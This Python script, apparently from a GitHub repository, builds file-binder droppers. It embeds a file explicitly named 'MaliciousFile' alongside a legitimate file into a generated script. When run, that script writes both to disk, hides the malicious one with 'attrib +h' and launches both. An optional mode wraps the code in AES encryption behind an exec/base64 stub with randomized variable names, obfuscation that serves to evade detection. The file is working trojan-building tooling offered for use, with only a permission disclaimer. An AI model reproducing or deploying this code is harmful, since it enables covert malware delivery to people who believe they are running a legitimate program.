"""
Author: PoseidOwn
Source: https://github.com/Poseidown/fusion-files
Disclaimer: Do NOT use on any computer that you do not have explicit permission or own personally.
"""
# filetbinder.py - creates python file including code to combine the files together.
# Originally inspired by d4rkcat
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

from Crypto.Cipher import AES
import base64, random, string, os


def randKey(bytes):
    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))


def randVar():
    return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(
        random.choice("0123456789") for x in range(3))


def main(MaliciousFile, LegitFile, OutputFile, ExtractDir, EncryptCheckBox):

    BLOCK_SIZE, PADDING = 32, '{'
    pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
    #DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
    key, iv, enctype = randKey(32), randKey(16), ''
    cipherEnc = AES.new(key)
    bd64var, AESvar = randVar(), randVar()
    myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar),
                 'from base64 import b64decode as %s' % (bd64var), 'import os']
    myendings.append('from hashlib import sha256')

    try:
        with open(MaliciousFile, 'rb', 200000) as exe:
            mexe = exe.read().encode('base64')
        with open(LegitFile, 'rb', 200000) as exe:
            iexe = exe.read().encode('base64')
    except:
        return False
    path_update = ExtractDir
    try:
        template = '''
pathto = os.getenv("%s")
filename = "%s"
content = "%s"
filename2 = "%s"
content2 = "%s"

fullpath = pathto + os.sep + filename
fullpath2 = pathto + os.sep + filename2

paths = [[fullpath, content], [fullpath2, content2]]

for p in paths:
	if os.path.isfile(p[0]):
		with open(p[0], 'rb') as f:
			checksum = str(sha256(f.read()).hexdigest())
		origsum = str(sha256(p[1].decode('base64')).hexdigest())
		if origsum != checksum:
			os.remove(p[0])
			with open(p[0], 'wb') as out:
				out.write(p[1].decode('base64'))
	else:
		with open(p[0], 'wb') as out:
			out.write(p[1].decode('base64'))

try:
	os.popen('attrib +h ' + fullpath)
except:
	pass
os.startfile(fullpath)
os.startfile(fullpath2)
''' % (path_update, MaliciousFile.split(os.sep)[-1], mexe.replace('\n', ''), LegitFile.split(os.sep)[-1],
       iexe.replace('\n', ''))
    except:
        return False
    encrypted = EncodeAES(cipherEnc, template)
    with open('%s' % OutputFile + ".py", 'w') as drop:
        drop.write(";".join(myendings) + "\n")
        if EncryptCheckBox:
            drop.write("exec(%s(\"%s\"))" % (bd64var, base64.b64encode(
                "exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (AESvar, key, bd64var, encrypted))))
            return True
            #print '[***] Encrypted '
        else:
            #print '[***] Template'
            drop.write(template)
            return True

